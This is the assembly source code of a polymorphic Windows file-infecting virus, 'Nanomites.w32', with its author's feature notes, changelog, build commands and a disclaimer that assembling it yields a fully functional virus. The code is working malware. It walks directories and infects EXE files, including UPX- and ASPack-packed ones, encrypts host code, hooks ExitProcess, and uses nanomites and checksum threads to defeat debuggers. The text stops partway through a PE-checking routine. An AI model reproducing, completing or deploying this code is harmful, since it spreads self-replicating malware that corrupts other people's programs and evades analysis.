COMMENT *
  Nanomites.w32 v2.0b by deroko
  ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
  
  Name........... Nanomites.w32
  Author......... deroko
  Origin......... somwhere in Balcans
  Payload........ harmless
  Poly .......... Yes
  Meta .......... Ouuuu, No
  Size........... 11316 bytes (w/o poly)
                  with poly 11316 bytes + 10240 bytes
  
  This virus uses nanomites so It won't have any jcc/jmps in the code,
  Nanomites are jcc/jmp changed by Armadilo to int 3h  so this idea is 
  kinda  implemented into  this code. I have written  simple tut about 
  it  but it is available in  Serbian  only. By  reading nanojmp macro
  you will be able to figure it out by yourself.
    
  Virus currently supports infection of ASpack 2.x (I guess, tested on
  2.12), UPX  (0.8 - 1.25), PECompact 2.59, PEPack v1.0, and FSG v2.0.
  Probably it  will support  more  packers  as soon as I find time  to
  reverse 'em more. 
  
  It appends to last section, and no it doesn't move reloc if present.

  It is polymorphic virus (cool) and uses  DSRPE  which  stands  for : 
  "Deroko's Shity Random Polymorphic Engine", well this engine is  not
  finished yet completely, I have started working on it 2-3 months ago
  and due  to exams I  never finished it.  When I  started  coding it,
  I  had   many  ideas  and  I   planed  to implement  self  modifying
  poly engine (metamorph-poly engine, sounds cool) but it ain't happen
  Maybe I'll finish it  one day...  here is used simple, modified, and
  unfinished version... (maybe 10% done, but it works fine)
  
  Launches 4 threads :
  ====================================================================
  I  .......... For virus, this thread will infect files,  thread   is
                filled with nanomites, so  tracing,  and  checking  it, 
                in debugger is not smart thing to do.
  
  II .......... For main program. This thread will hook ExitProcess so
                any call to ExitProcess  from  infected  program  will 
                return to this thread.
  
  III.......... For checksum checking. Thread  will  loop   constantly
                during execution of viri thread. It will  check check-
                sum in 100miliseconds time intervals. If  checksum  is
                wrong,   it  means  someone  is  using  breakpoint  in
                virus, and virus  will  terminate whole  process, also
                this Thread will  loop trough API  addresses and check
                if there is BP set in API calls.
 
  IV........... This is payload thread, it will popup at 13th of every
                month, will create window via CreateWindowExA and will
                show you lyrics of She is my sin - Nightwish. It  will
                stay active untill infected program doesn't finish...
  ====================================================================
  
  14/07/2005....Added support for FSG v2.0, and for PEPack v1.0
                Search KEYWORD ................................... FSG
                               ................................ PEPack
                               
  08/07/2005....Added  5  different internal decryptions, very simple,
                such  as  xor al,cl/sub al,cl/add al,cl/rol al,cl  and
                ror al,cl... fixed some minor bugs...
                 
  07/07/2005....Added  payload, on every  13th Window  will pop-up and
                show you lyrics of Nightwish - "She is my sin"...
                Also added 3 crypt/decrypt algos for saved  host  data
                depending on random number generator...
                Search KEYWORD: .............................. payload
                              
  05/07/2005....Added support for PECompact 2.59, solved problem  from
                earlier versions with inline patching bcc32 .exe files
                which used to overwrite TLS and foobar program.
                Added  CheckKernel32Apis in  CheckSumThread, this proc
                will loop  APIs checking for BPX set in kernel32 APIs,
                if so, terminate process.
                Search KEYWORD: ............................ PECompact
                                .................... CheckKernel32Apis
                Nanomite SEH updated... sets Dr0/Dr3 to 0
                Added Polymorphic engine DSRPE. <check dsrpe32bin.inc>     
  
  04/07/2005....Added internal decryption,just simple rol al, cl, also
                changed API loading routine  and filled with nanomites 
  
  03/07/2005....Added support for UPX and ASPack, also added my ldex86
                (Length Decoder for x86), so I can handle  UPX  packer
                much better. 
                Search KEYWORD: .................................. UPX
                                ............................... ASPack
                                ...................... RecognizePacker
  
  02/07/2005....Nanomites.w32 project has started.
                                                                
  Lets begin...
                                   deroko        0x/07/2005
 
DISLAIMER...

This code is for research  and  educational  purposes only. The assembling
of this file will produce a fully functional virus. Writing viruses is not 
ilegal  but  spreading  binary viruses is ilegal. So you have been warned.
Author of  this  virus may not be held  responsible for the acts of  other
persones. 
Everybody  should be  responsible for  their own acts, the first and basic 
rule of every criminal law.
This source code  is  provided  "as is".  Modification of this source code
will  derive in  a  new  virus  that  must  not be  considered  the  virus 
sourced here.
                                   deroko        0x/07/2005  

COMPILE:
tasm32 /ml /z /m9 /q  nano
tlink32 -x /Tpe /aa /c nano,,,import32.lib
pewrite nano.exe

ps. Coding style ripped from Lord Julus...
 *
 
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
.586p                                            ;
.model flat, stdcall                             ;
TRUE                 =      1                    ;
FALSE                =      0                    ;                        
WEIRDDELTA           =      TRUE                 ; to get weird delta
CHECKSUM             =      TRUE                 ; for debuging in next generations set FALSE
NANOMITES            =      TRUE                 ; for Nanomites in the code (FALSE for debuging)
TESTPAYLOAD          =      FALSE                ; Don't infect, test payload only (TRUE)
WHATDAY              =      13                   ; when to triger payload. Jason? nah...
include nano.inc                                 ; just my lucky number...
                                                 ;
calle macro xxx                                  ;
       call dword ptr[ebp+xxx]                   ;
endm                                             ;
                                                 ;
IF NANOMITES                                     ;
nanojmp macro  jmp_t, __xxx                      ;
       local nano                                ;
nano:  int 3h                                    ; set int 3h
       db jmp_t                                  ; jmp type (see nano.inc)
       dd offset __xxx - offset nano             ; relative displacement added to EIP
endm                                             ;
ELSE                                             ;
nanojmp macro jmp_t, __xxx                       ; if I'm debugging I use normal
       if jmp_t eq jmp_jz                        ; jcc/jmp and no nanomites...
       jz __xxx                                  ; This makes easier to code, and
       endif                                     ; I don't have to change each jcc/jmp
       if jmp_t eq jmp_jnz                       ; with nanomites later...
       jnz __xxx                                 ; Just change NANOMITES to FALSE to
       endif                                     ; use normal jcc/jmp insted of 
       if jmp_t eq jmp_jb                        ; weird nanojmp macro...
       jb __xxx                                  ;
       endif                                     ;
       if jmp_t eq jmp_jnb                       ;
       jnb __xxx                                 ;
       endif                                     ;
       if jmp_t eq jmp_jmp                       ;
       jmp __xxx                                 ;
       endif                                     ;
endm                                             ;
ENDIF                                            ;
                                                 ;
nots macro string                                ;NOT a string
       irpc _x,<string>                          ;Used for payload...
       notbyte = not('&_x&')                     ;
       db notbyte                                ;
       endm                                      ;
       db not(13)                                ;
       db not(10)                                ;
endm                                             ;
                                                 ;
notsend macro                                    ;NOT 0 as end of string
       db not(0)                                 ;Just terminates payload string
endm                                             ;with 0
                                                 ;
                                                 ;
virus_size    equ nano_end-nano_start            ;
viri_size     equ virus_size                     ;
section       equ 6000h                          ; my god, it ain't that big...
poly_size     equ 2800h                          ; dsrpe can generate about 6-8kb
.data                                            ; garbage so this is needed...
dd     ?                                         ;
                                                 ;
.code                                            ;
__start:                                         ;
nano_start:                                      ;   
       call getdelta                             ;
getdelta:                                        ;
       IF WEIRDDELTA                             ;
       xor ebx, ebx                              ; if call is followed by pop 
       pop ebx                                   ; NOD32 will find suspicious file
       mov eax, offset getdelta                  ; blah... xor ebx, ebx is just
       mov [ebx+patch1st-getdelta], eax          ; anti-heuristic...
       clc                                       ;
       sbb ebp, ebp                              ;
       sub ebp, 10000001h                        ;
patch1st = dword ptr $-4                         ;
       add ebp, ebx                              ;
       xor eax, eax                              ;
       mov [ebx+patch1st-getdelta], eax          ;
       ELSE                                      ;
       xor ebp, ebp                              ;
       pop ebp                                   ;
       sub ebp, offset getdelta                  ;
       ENDIF                                     ;
       test ebp, ebp                             ;
       jz first                                  ;
                                                 ;
       inc [ebp+generation]                      ; Calculate generations
       jmp DoDecrypt                             ;
first:                                           ;
       mov [ebp+generation], 0                   ;
       jmp EncryptedArea                         ;
DoDecrypt:                                       ;
       lea esi, [ebp+EncryptedArea]              ;
                                                 ;
       xor edx, edx                              ;
       lea eax, [ebp+dec_seh]                    ;
       push eax                                  ;
       push dword ptr FS:[edx]                   ;
       mov dword ptr FS:[edx], esp               ; Set decryption SEH
                                                 ; and enter into single
       xor eax, eax                              ; steping...
       mov al, 1                                 ;
       rol eax, 8                                ;
       push eax                                  ; eax = 00000100h
       popfd                                     ; and set Trap flag...
       jmp RemoveSeh                             ; 1st instruction ain't 
                                                 ; traced...
dec_seh:                                         ;
       mov ebx, [esp+00Ch]                       ;
       mov esi, [ebx.CONTEXT_Esi]                ;
       mov edi, esi                              ;
       mov ecx, (crypt_end - EncryptedArea)      ;
do_dec:                                          ;
       lodsb                                     ; small, internal decryption...
meta1: rol al, cl                                ; will be changed from gene to gene with
       stosb                                     ; some other simple algo...
       loop do_dec                               ; 
       xor eax, eax                              ;
       ret                                       ;
                                                 ;
RemoveSeh:                                       ;
       pop dword ptr FS:[edx]                    ;
       add esp, 4                                ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Virus starts from here                         ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EncryptedArea:                                   ;
       xor edx, edx                              ;
       lea eax, [ebp+sehhandle]                  ;
       push eax                                  ;
       push dword ptr FS:[edx]                   ;
       mov dword ptr FS:[edx], esp               ;
                                                 ;
       call IsDebugPresent                       ; anti-debug
       test eax, eax                             ; 1st check for emu
       nanojmp jmp_jnz, getdelta                 ;
       cmp eax, 0                                ; 2nd check for emu
       nanojmp jmp_jnz, getdelta                 ;
       dec eax                                   ; 3rd check for emu
       nanojmp jmp_jz, getdelta                  ;
                                                 ;
       call getkernelbase                        ; get kernel32 base
       mov [ebp+kernel32], eax                   ; and store it
       lea esi, [ebp+kernel32apis]               ;
       lea edi, [ebp+GetModuleHandleA]           ;
       mov ecx, kernel32apisnum                  ;
       mov ebx, eax                              ;
       call LoadApis                             ; Load kernel32 apis
       calle IsDebuggerPresent                   ; debugger?
       test eax, eax                             ;
       nanojmp jmp_jnz getdelta                  ;
       nanojmp jmp_jnz getdelta                  ;
       nanojmp jmp_jnz getdelta                  ;
                                                 ;
       call InitSeed                             ; prepate random_seed...
                                                 ;
       xor eax, eax                              ;
       push PAGE_READWRITE                       ;
       push MEM_COMMIT                           ;
       push 1000h                                ;
       push eax                                  ;
       calle VirtualAlloc                        ; alloc memotry for 
       test eax, eax                             ; WIN32_FIND_DATA
       nanojmp jmp_jz, terminate_process         ;
       mov [ebp+wfdptr], eax                     ;
                                                 ;
       cmp [ebp+generation], 0                   ; 1st gene?
       nanojmp jmp_jne, go_multi_thread          ; 
                                                 ;
       call GiveMeCheckSum                       ; calculate checksum
       mov [ebp+CheckSum], eax                   ; and save it
       IF TESTPAYLOAD                            ;
       call payload                              ;
       calle ExitProcess                         ;
       ELSE                                      ;
       call SearchFiles                          ; yes, just infect files
       ENDIF                                     ;
       nanojmp jmp_jmp, firstgen                 ;
                                                 ;
go_multi_thread:                                 ; go to multithreading viri
                                                 ;
       push [ebp+OldEntryPoint]                  ;
       pop [ebp+CurrentEntryPoint]               ;
                                                 ;
       call HookExitProcess                      ; ExitProcess must be hooked
                                                 ;
       cmp [ebp+packed], 1                       ; is infected file packed?
       nanojmp jmp_je, skip_loader_part          ; 
                                                 ;
                                                 ; 
       xor eax, eax                              ;
       push eax                                  ;
       calle GetModuleHandleA                    ;
       add eax, [ebp+CurrentEntryPoint]          ;
       mov edi, eax                              ;
                                                 ;
       push esp                                  ;
       push esp                                  ;
       push PAGE_READWRITE                       ;
       push 1000h                                ;
       push eax                                  ;
       calle VirtualProtect                      ; mark EP as READ/WRITE
       pop ecx                                   ;
                                                 ;
       mov esi, [ebp+DecryptHost]                ;
       add esi, ebp                              ;
       call esi                                  ; call DecryptHost
                                                 ;
       lea esi, [ebp+old_host]                   ; and restore host...
       mov ecx, loader_size                      ;
       cld                                       ;
       rep movsb                                 ;
                                                 ;
       mov esi, [ebp+CryptHostAgain]             ; and crypt it againg
       add esi, ebp                              ; just to be sure =)
       call esi                                  ;             
skip_loader_part:                                ;
                                                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; MultiThreading starts...........
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       xor edx, edx                              ; remove nanomites SEH
       pop dword ptr FS:[edx]                    ; ====================
       add esp, 4                                ; ====================
                                                 ;       
       mov [ebp+nano_initialized], 1             ;
       xor eax, eax                              ;
       push esp                                  ;
       push eax                                  ;
       push eax                                  ;
       lea ebx, [ebp+NanoThread]                 ;
       push ebx                                  ;
       push eax                                  ;
       push eax                                  ;
       calle CreateThread                        ;
       mov [ebp+hThread1], eax                   ; Viri Thread is ready to go...
                                                 ;
       xor eax, eax                              ;
       push esp                                  ;
       push eax                                  ;
       push eax                                  ;
       lea ebx, [ebp+ProgramThread]              ;
       push ebx                                  ;
       push eax                                  ;
       push eax                                  ;
       calle CreateThread                        ;
       mov [ebp+hThread2], eax                   ; Program thread goes now...
                                                 ;
       xor eax, eax                              ;
       push esp                                  ;
       push eax                                  ;
       push eax                                  ;
       lea ebx, [ebp+CheckSumThread]             ;
       push ebx                                  ;
       push eax                                  ;
       push eax                                  ;
       calle CreateThread                        ; ChekSum Thread is launched...
       mov [ebp+hThread3], eax                   ;
                                                 ;
       xor eax, eax                              ;
       push esp                                  ;
       push eax                                  ;
       push eax                                  ;
       lea ebx, [ebp+PayloadThread]              ;
       push ebx                                  ;
       push eax                                  ;
       push eax                                  ; 
       calle CreateThread                        ; Payload thread goes now...
       mov [ebp+hThread4], eax                   ;
                                                 ;                                                
       stc                                       ;
       sbb eax, eax                              ; eax = -1
       push eax                                  ; INFINITE
       add eax, 2                                ; eax = 1
       push eax                                  ; Wait All?? YES
       lea ebx, [ebp+hThread1]                   ; 
       push ebx                                  ; array of thread handles
       add eax, 3                                ; eax = 1 + 3 = 4 threads
       push eax                                  ;
       calle WaitForMultipleObjects              ;
                                                 ;
terminate_process:                               ;
       xor eax, eax                              ;
       push eax                                  ;
       dec eax                                   ;
       push eax                                  ;
       calle TerminateProcess                    ;
                                                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Thread that laucnches viri in other generations
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
NanoThread proc                                  ;
       call getnanodelta                         ;
getnanodelta:                                    ;
       pop ebp                                   ;
       sub ebp, offset getnanodelta              ;
       push ebp                                  ;
       @SEH_SetupFrame <jmp exception_inf>       ; set SEH for unhandled
                                                 ; exception in NanoThread
       xor edx, edx                              ;
       lea eax, [ebp+sehhandle]                  ;
       push eax                                  ; set nanoseh
       push dword ptr FS:[edx]                   ;
       mov dword ptr FS:[edx], esp               ;
                                                 ;
       call SearchFiles                          ; and call infection
                                                 ;
       pop dword ptr FS:[edx]                    ; and remove it
       add esp, 4                                ;
                                                 ;
exception_inf:                                   ;
       @SEH_RemoveFrame                          ;
       pop ebp                                   ;
                                                 ;
       mov [ebp+nano_initialized], 0             ; signal for checking thread
       ret                                       ;
NanoThread endp                                  ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;ProgramThread ... return to original entrypoint
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ProgramThread proc                               ;
       call getprogramdelta                      ;
getprogramdelta:                                 ;
       pop ebp                                   ;
       sub ebp, offset getprogramdelta           ;
       mov [ebp+s_esp], esp                      ; save ESP for ret after
       mov [ebp+program_end], 1                  ; ExitProcess returns to
                                                 ; return_ExitProcess label
       xor eax, eax                              ;
       push eax                                  ;
       calle GetModuleHandleA                    ;
       add eax, [ebp+CurrentEntryPoint]          ;
       jmp eax                                   ; redirect execution to main progy
return_ExitProcess:                              ; <- ok program has exited... nice
       call retExitProcess                       ;
retExitProcess:                                  ;
       pop ebp                                   ;
       sub ebp, offset retExitProcess            ;
       mov esp, [ebp+s_esp]                      ;
       mov [ebp+program_end], 0                  ;
       ret                                       ;
ProgramThread endp                               ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;CheckSumThread - will constantly run and will check for BPs  or any other
; patching by comparing cheksum from first gene with current gene
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CheckSumThread proc                              ;
       call getchecksumdelta                     ;
getchecksumdelta:                                ;
       pop ebp                                   ;
       sub ebp, offset getchecksumdelta          ;
                                                 ;
check_checksum:                                  ;
       IF CHECKSUM                               ;
       call GiveMeCheckSum                       ;
       cmp [ebp+CheckSum], eax                   ; if checksums don't match terminate 
       jne terminate_process                     ; process
       ENDIF                                     ;
       call CheckKernel32Apis                    ; if BP is set inside of APIs, terminate
       jc terminate_process                      ; process
       push 100                                  ; 100 miliseconds
       calle Sleep                               ; and sleep for some time...
       cmp [ebp+nano_initialized], 0             ; check if viri thread is done
       jne check_checksum                        ; nope go again =)
       ret                                       ;
CheckSumThread endp                              ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; This will hook ExitProcess so it will return to our MainThread
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
HookExitProcess proc                             ;
       pushad                                    ;
       push esp                                  ;
       push PAGE_READWRITE                       ;
       push 1000h                                ;
       push [ebp+ExitProcess]                    ;
       calle VirtualProtect                      ; mark ExitP as READWRITE
       mov edi, [ebp+ExitProcess]                ;
       mov eax, 0B8h                             ; construct :
       stosb                                     ; mov eax, offset return_ExitProcess
       lea eax, [ebp+return_ExitProcess]         ;
       stosd                                     ;
       mov ax, 0E0FFh                            ; jmp eax
       stosw                                     ;
       popad                                     ;
       ret                                       ;
HookExitProcess endp                             ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Pay the price ... PayloadThread...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PayloadThread proc                               ;
       call payloadthread                        ;
payloadthread:                                   ;
       pop ebp                                   ;
       sub ebp, offset payloadthread             ;
       lea eax, [ebp+systime]                    ;
       push eax                                  ;
       calle GetSystemTime                       ;
       cmp [ebp+systime.st_wDay], WHATDAY        ;
       jne exit_PayloadThread                    ;
                                                 ;
       push ebp                                  ;                                          
       @SEH_SetupFrame <jmp exception_pay>       ;
                                                 ;
       xor edx, edx                              ;
       lea eax, [ebp+sehhandle]                  ;
       push eax                                  ;
       push dword ptr FS:[edx]                   ;
       mov dword ptr FS:[edx], esp               ;
                                                 ;
do_payload_again:                                ;                      
       call payload                              ;
       cmp [ebp+program_end], 0                  ;
       jne do_payload_again                      ;
                                                 ;
       xor edx, edx                              ;
       pop dword ptr FS:[edx]                    ;
       add esp, 4                                ;
                                                 ;
exception_pay:                                   ;
       @SEH_RemoveFrame                          ;
       pop ebp                                   ;
                                                 ;
exit_PayloadThread:                              ;
       ret                                       ;
PayloadThread endp                               ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Search for EXE PE files
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
SearchFiles proc                                 ;
       pushad                                    ;
       push "*.*"                                ;
       mov eax, esp                              ;
       push [ebp+wfdptr]                         ;
       push eax                                  ;
       calle FindFirstFileA                      ;
       pop ecx                                   ;
       inc eax                                   ;
       nanojmp jmp_jz, exit_search               ;
       dec eax                                   ;
       mov esi, eax                              ;
       mov edi, [ebp+wfdptr]                     ;
       test [edi.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY ;
       nanojmp jmp_jnz, dir                      ;
                                                 ;
loop_files:                                      ;
       push esi                                  ;
       push edi                                  ;
       push esi                                  ;
       calle FindNextFileA                       ;
       pop esi                                   ;
       test eax, eax                             ;
       nanojmp jmp_jz, exit_search               ;
       test [edi.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY ;
       nanojmp jmp_jnz, dir                      ;
       push [edi.WFD_nFileSizeLow]               ;
       pop [ebp+fsize]                           ;
       lea ebx, [edi.WFD_szFileName]             ;
       mov [ebp+fname], ebx                      ;
       push edi                                  ;
       mov edi, ebx                              ;
       sub eax, eax                              ;
       mov ecx, 260                              ;
       cld                                       ;
       repnz scasb                               ;
       mov eax, [edi-5]                          ;
       pop edi                                   ;
       or eax, 20202000h                         ;
       xor eax, 'ored'                           ;
       cmp eax, 'exe.' xor 'ored'                ;
       nanojmp jmp_jne, continue_searching       ;
       call InfectFile                           ; try to infect EXE 
                                                 ;
continue_searching:                              ;
       nanojmp jmp_jmp, loop_files               ;
                                                 ;
dir:                                             ;
       lea ebx, [edi.WFD_szFileName]             ;
       cmp byte ptr[ebx], '.'                    ;
       nanojmp jmp_je, loop_files                ;
       mov eax, [ebx]                            ;
       or eax, 20202020h                         ;
       and eax, 0FFFFFFh                         ;      
       cmp eax, 'niw'                            ;Don't infect WINDOWS folder
       nanojmp jmp_je, loop_files                ;
       push ebx                                  ;
       calle SetCurrentDirectoryA                ;
       call SearchFiles                          ;
       nanojmp jmp_jmp, loop_files               ;
                                                 ;
exit_search:                                     ;
       push esi                                  ;
       calle FindClose                           ;
       push '..'                                 ;
       push esp                                  ;
       calle SetCurrentDirectoryA                ;
       pop ecx                                   ;
       popad                                     ;
       ret                                       ;
SearchFiles endp                                 ;        
                                                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Infect PE EXE files
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
InfectFile proc                                  ;
       pushad                                    ;
       call OpenFile                             ; open file for checking
       nanojmp jmp_jc, exit_IF                   ;
       call CheckPE                              ; is it valid PE?
       nanojmp jmp_jc, exit_close                ;
       call CheckCriterium                       ; just to check if file is packed
       nanojmp jmp_jc, exit_close                ; with right packer or is not packed
       call CloseFile                            ;
                                                 ;
       push [ebp+fsize]                          ;
       pop [ebp+old_fsize]                       ;
       add [ebp+fsize], section                  ;
                                                 ;
       call OpenFile                             ;
       nanojmp jmp_jc, exit_IF                   ;
                                                 ;
       call CheckCriterium                       ; recognize packer and fill some vars
                                                 ; and call this again but with incrased fsize...
       mov ebx, [ebp+nthdr]                      ; NTheaders in ebx
       movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections] ; number of sections
       dec ecx                                   ;
       imul ecx, ecx, size IMAGE_SECTION_HEADER  ; 
       lea eax, [ebx+ecx+0F8h]                   ; go to last section
                                                 ;
       cmp [ebp+packed], 0                       ; different EPO for packed
       nanojmp jmp_je, not_packed_1              ; and non-packed files
                                                 ;
       mov edi, [eax.SH_VirtualAddress]          ;
       add edi, [eax.SH_SizeOfRawData]           ; RAV of virus
       mov esi, [ebp+entry_raw]                  ;
       calle FooBarPacker                        ;
       nanojmp jmp_jmp, mark_file_and_copy       ;
                                                 ;
not_packed_1:                                    ;
       mov edi, [eax.SH_VirtualAddress]          ;
       add edi, [eax.SH_SizeOfRawData]           ;
       add edi, [ebx.NT_OptionalHeader.OH_ImageBase] ;
       mov [ebp+patch_loader_va], edi            ; patch loader with VA of virus
                                                 ;
       mov edi, [ebp+entry_rva]                  ;
       add edi, (loader - Loader)                ;
       add edi, [ebx.NT_OptionalHeader.OH_ImageBase] ;
       mov [ebp+patch_loader], edi               ; and store SEH address       
                                                 ;
       mov esi, [ebp+entry_raw]                  ;
       add esi, [ebp+memptr]                     ;
       push esi                                  ;
       lea edi, [ebp+old_host]                   ;
       mov ecx, loader_size                      ;
       cld                                       ;
       rep movsb                                 ; save old host
                                                 ;
       pop edi                                   ;
       lea esi, [ebp+Loader]                     ;
       mov ecx, loader_size                      ;
       rep movsb                                 ; and store loader
                                                 ;
                                                 ;
       push [ebp+entry_rva]                      ;
       pop [ebp+OldEntryPoint]                   ;
                                                 ;
mark_file_and_copy:                              ;
       pushad                                    ;
       calle GetTickCount                        ; get random ViriKeyInc
       mov [ebp+ViriKeyInc], eax                 ;
       rdtsc                                     ;
       add eax, edx                              ;
       mov [ebp+ViriKey], eax                    ; get random ViriKey
       call CryptHost                            ; Crypt host (doesn't metter if packed or not)
       popad                                     ;
                                                 ;
       lea esi, [ebp+nano_start]                 ;
       mov edi, [ebp+memptr]                     ;
       add edi, [eax.SH_PointerToRawData]        ;
       add edi, [eax.SH_SizeOfRawData]           ;
                                                 ;
       push eax                                  ;
       push edi                                  ;
                                                 ;
       add edi, poly_size                        ; virus is gona be copied here
                                                 ;
       call MetamorphizeInternal                 ; metamorphize internal decryptor
                                                 ;
       mov ecx, EncryptedArea - nano_start       ; now copy unencrypted area
       rep movsb                                 ;
                                                 ;
       mov ecx, crypt_end - EncryptedArea        ;
                                                 ;
       call [ebp+InternalCrypt]                  ; and call right internal crypt 
                                                 ;
       lodsd                                     ; load and store
       stosd                                     ; generation count
                                                 ;
       pop edx                                   ;
       pop eax                                   ;
       pushad                                    ; save all regs
       lea esi, [edx+poly_size]                  ; 
       mov ecx, (nano_end - nano_start) / 4      ; size of viri shr/4
       call EncryptViri                          ; EncryptViri
       popad                                     ; and restore regs...
                                                 ;
       mov edi, edx                              ;
       sub edx, [eax.SH_PointerToRawData]        ;
       sub edx, [ebp+memptr]                     ;
       add edx, [eax.SH_VirtualAddress]          ;
       add edx, [ebx.NT_OptionalHeader.OH_ImageBase] ; 
       add edx, poly_size                        ; get VA of encrypted viri
                                                 ;
       mov ecx, eax                              ; now prepare everything for poly
       push edi                                  ; generate poly here 6th arg
       push [ebp+ViriKeyInc]                     ; ViriKeyInc 5th arg        
       push [ebp+memptr]                         ; ptr to mapped file 4th arg
       push [ebp+ViriKey]                        ; ViriKey 3rd arg
       push (nano_end-nano_start) / 4            ; Size/4 2nd arg
       push edx                                  ; virual address of viri
       call DSRPE                                ; and call poly engine
                                                 ; eax has size of generated poly...
       pushad                                    ;
       add edi, eax                              ; NOPs are here =)
       mov ecx, poly_size                        ;
       sub ecx, eax                              ;
       calle GetTickCount                        ; fill NOPs with some
       shr ecx, 2                                ; random data
fill_the_buffer:                                 ;
       rol eax, 7                                ;
       stosd                                     ;
       loop fill_the_buffer                      ;
       popad                                     ;
                                                 ;                                                                                                         
       add [ecx.SH_SizeOfRawData], section       ; update section and also
       add [ecx.SH_VirtualSize], section         ; update SizeOfImage
       or [ecx.SH_Characteristics], IMAGE_SCN_MEM_WRITE ;
       add [ebx.NT_OptionalHeader.OH_SizeOfImage], section ;
       mov ebx, [ebp+memptr]                     ;
       lea ebx, [ebx.MZ_res2]                    ;
       mov dword ptr[ebx], 'ored'                ; mark file with 'deroko' =)
       mov dword ptr[ebx+4], 'ok'                ;
                                                 ; 
exit_close:                                      ;
       call CloseFile                            ;
exit_IF:                                         ;
       popad                                     ;
       ret                                       ;
InfectFile endp                                  ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; OpenFile - [ebp+fsize] == size of file
;          - [ebp+memeptr] == ptr to maped file
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
OpenFile proc                                    ;
       pushad                                    ;
       xor ebx, ebx                              ;
       push ebx                                  ;
       push ebx                                  ;
       push OPEN_EXISTING                        ;
       push ebx                                  ;
       push ebx                                  ;
       push GENERIC_READ + GENERIC_WRITE         ;
       push [ebp+fname]                          ;
       calle CreateFileA                         ;
       inc eax                                   ;
       nanojmp jmp_jz, error_open                ;
       dec eax                                   ;
       mov [ebp+fd], eax                         ;
                                                 ;
       push ebx                                  ;
       push [ebp+fsize]                          ;
       push ebx                                  ;
       push PAGE_READWRITE                       ;
       push ebx                                  ;
       push eax                                  ;
       calle CreateFileMappingA                  ;
       test eax, eax                             ;
       nanojmp jmp_jz, error_open                ;
       mov [ebp+temp], eax                       ;
                                                 ;
       push [ebp+fsize]                          ;
       push ebx                                  ;
       push ebx                                  ;
       push FILE_MAP_WRITE                       ;
       push eax                                  ;
       calle MapViewOfFile                       ;
       test eax, eax                             ;
       nanojmp jmp_jz, error_open                ;
       mov [ebp+memptr], eax                     ;
       clc                                       ;
       nanojmp jmp_jmp, open_ret                 ;
error_open:                                      ;
       stc                                       ;
open_ret:                                        ;
       popad                                     ;
       ret                                       ;
OpenFile endp                                    ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; checks for valid PE
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CheckPE proc                                     ;
       pushad                                    ;
       mov ebx, [ebp+memptr]                     ;
       mov eax, [ebx+3ch]                        ;
       cmp eax, 1000h                            ;
       nanojmp jmp_jnb, error_pe                 ;
       lea edx, [ebx.MZ_res2]                    ;
       cmp dword ptr[edx], 'ored'                ;
       nanojmp jmp_je, error_pe                  ;
       add ebx, eax                              ;
       movzx ecx, word ptr[ebx]                  ;
